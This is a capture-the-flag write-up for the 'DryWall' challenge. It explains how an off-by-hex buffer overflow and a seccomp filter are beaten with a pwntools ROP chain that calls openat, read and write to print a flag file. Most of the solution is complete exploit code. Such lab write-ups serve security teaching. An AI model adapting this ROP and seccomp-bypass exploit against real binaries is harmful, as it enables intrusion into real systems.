# DryWall
Created by: Didkd  
Writeup by: Ethan Andrews (UofUsec)

## Description
My code is so secure! I have so many security measures! Its like a brick wall! I love security! Maybe I'll add more security to it later!

## Writeup
### Initial Looks
Upon execution, we see that it asks for two user inputs. The first user input is prompted by the program asking for your name. Then it displays what appears to be an address. Finally, it accepts the second user input.

![image](https://github.com/user-attachments/assets/cf6d2c81-3723-4cde-8c25-aec350a234b2)

### Gathering Information
Conveniently, the source code is provided, so we don't initially need to use Ghidra (though we might find it useful later on). 

Immediately, we see the following:

![image](https://github.com/user-attachments/assets/63f5b4c9-3c6e-4ea3-997e-29540bcc7ed7)

This binary applies a seccomp filter. This means that it does not allow certain syscalls. Specifically, it does not allow
execve, open, execveat, readv, writev, process_vm_readv, process_vm_writev. This means that our solution cannot involve
system calls to any of these.

Now we see the input code. It appears there are two buffers for input: buf and name.

![image](https://github.com/user-attachments/assets/d13581ea-4ff5-49e9-8827-c7765e36376f)

![image](https://github.com/user-attachments/assets/75458078-e128-44b2-b780-11b88beb8ed9)

We see that buf is stored on the stack and name is stored in the .data section (since it is a static buffer).

By analyzing the c code, we can see that the address that gets printed out is the address of the main function. We can
also see that the designers made an error. Instead of reading in 256 bytes into buf, it reads in 0x256 bytes which is
equivalent to 598 bytes.

![image](https://github.com/user-attachments/assets/9a7eddc2-0b9c-434b-aee0-93782742e094)

So now we have the offset of the executable, a way to write data to the .data section of the executable, and the ability to
buffer overflow the stack.

### Solution

We will use pwntools for this solution:

```python
from pwn import *

exe = context.binary = ELF("./chal")
p = process("./chal")
```

First, we will just fill the first input with random data and extract the address of main to set the context.

```python
print(p.recvuntil(b"?\n"))

# Send random data for the first input
p.send(b"random\n")

# Now we will extract the main address
print(p.recvuntil(b";)\n"))
raw_addr = p.recvuntil(b"\n")[:-1]
main_address = int(raw_addr, 16)

# Set the base address for the context
exe.address = main_address - exe.symbols['main']
```

Now we need to determine how much padding to override the return address. This can be done in a variety of ways
(radare2 has a way to do this using cyclic strings), but I used trial and error while analyzing it through GDB. I
determined that the payload required 280 bytes of padding.

```python
payload = b"\x90" * 280
```

### Opening the file

If we had access to the execve function, this would be a straightforward ROP problem. However, we don't have access to
this call. We also don't have access to the open function. However, the openat function is not filtered, so we can
use this instead.
```c++
int openat(int dirfd, const char *pathname, int flags, ...);

// int dirfd -> the file descriptor of the directory relative to the file pathname
// const char *pathname -> the string of the pathname
// int flags -> flags that determine how the file is opened
```

We aim to reproduce the following syscall:
```c++
int openat(-100, "flag.txt", 0);
// -100 -> current directory
// flag.txt -> the name of the file
// 0 -> Open read_only
```

Since we set the context, we can use pwntool's ROP functionality to achieve this. The RAX argument for
an openat call is 257. We can then use ROP to set the RAX value:

```python
rop = ROP(exe)

rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(257)
```

We can also set the rdi value to -100.
```python
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(-100)
```

Now we've run into a serious issue. This argument doesn't take in a string, it takes in a pointer to a string. This means
we need to know the address of a string "flag.txt". We can't just put this string into our payload buffer and reference it
because we don't know the address of the stack.

However, if you remember earlier, the name buffer we filled with random data earlier didn't exist on the stack, it existed
in the .data section, which is at the same offset as the .text section (the section with the functions). This means, since we
know the location of main, we also know the location of the name buffer.

We can simply fill the name buffer with "flag.txt". The updated code now shows:

```python
from pwn import *

exe = context.binary = ELF("./chal")
p = process("./chal")

print(p.recvuntil(b"?\n"))

p.send(b"flag.txt" + b"\x00" + b"\n")

# Now we will extract the main address
print(p.recvuntil(b";)\n"))
raw_addr = p.recvuntil(b"\n")[:-1]
main_address = int(raw_addr, 16)

# Set the base address for the context
exe.address = main_address - exe.symbols['main']

payload = b"\x90"*280

rop = ROP(exe)

# openat gadget
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(257)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(-100)
```

We can now pop the address of the name buffer into rsi:
```python
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
# We need to add an extra 0 because the gadget is actually pop rsi, pop r15, ret
rop.raw(0)
```

Now we can set rdx to 0 to complete the gadget.
```python
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(0)

# Add a syscall
rop.raw(rop.find_gadget(['syscall', 'ret']))
```

### Reading the file

Now that the file is open, we need to read it to a buffer. Luckily, we can just reuse the name buffer (equivalently, you
could write the flag to any area in the .data function since the entirety of it is mapped out).

Now we've come to our second big issue. Even though we've opened the file, in order to read it, we need the file descriptor.
Unfortunately, there are no gadgets that allow us to extract the file_descriptor after it gets returned from the openat call.

Fortunately, file descriptors always start at 3 and increase sequentially based on a single program. So if two files are 
open, the descriptors would be 4 and 5. This means we can probably assume that our file is the only file opened by this program,
meaning that our file descriptor is more than likely going to be 3.

We will just read 50 characters to be safe in order to extract the entire flag. (Note: one may be concerned about overflow
since the buffer we are writing to is only 30 characters long. This is no issue because the buffer exists in the .data section, so any overflow
simply overflows into the writable area)

This means our read call is going to be:

```c++
read(3, name_buffer, 50);
```

We can reuse the ROP gadgets we found earlier to produce the following:

```python
# 0 is the rax code for read
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(0)

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(3)
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
rop.raw(0x0)
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(50)
rop.raw(rop.find_gadget(['syscall', 'ret']))
```

### Printing the flag
Now we will simply write this buffer to the standard output. Luckily, everything here is straightforward:
```c++
write(1, name_address, 50);
// 1 -> code for stdout
// name_address -> address of the buffer
// 50 -> number of bytes to write
```

We can reuse the gadgets from earlier to produce:
```python
# 1 is the rax code for write
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(1)

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(1)
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
rop.raw(0x0)
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(50)
rop.raw(rop.find_gadget(['syscall', 'ret']))
```

Now we will simply construct the payload and send it:
```python
payload += rop.chain()
payload += b"\n"

p.send(payload)

# The p.interactive() call is crucial to ensure that the subprocesses
# stdout call gets linked to the terminal. Otherwise, you wouldn't see the
# printed flag
p.interactive()
```

This gives us the final exploit:
```python
from pwn import *

exe = context.binary = ELF("./chal")
p = process("./chal")

print(p.recvuntil(b"?\n"))

p.send(b"flag.txt" + b"\x00" + b"\n")

# Now we will extract the main address
print(p.recvuntil(b";)\n"))
raw_addr = p.recvuntil(b"\n")[:-1]
main_address = int(raw_addr, 16)

# Set the base address for the context
exe.address = main_address - exe.symbols['main']

payload = b"\x90"*280

rop = ROP(exe)

# openat gadget
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(257)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(-100)
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(0)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# read gadget
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(0)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(3)
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
rop.raw(0x0)
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(50)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# write gadget
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(1)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(1)
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(exe.symbols['_ZL4name'])
rop.raw(0x0)
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(50)
rop.raw(rop.find_gadget(['syscall', 'ret']))

payload += rop.chain()
payload += b"\n"

p.send(payload)
p.interactive()
```

Running this exploit returns the flag.

## Important Concepts
- seccomp filters
- buffer overflow
- rop chaining
- .data section
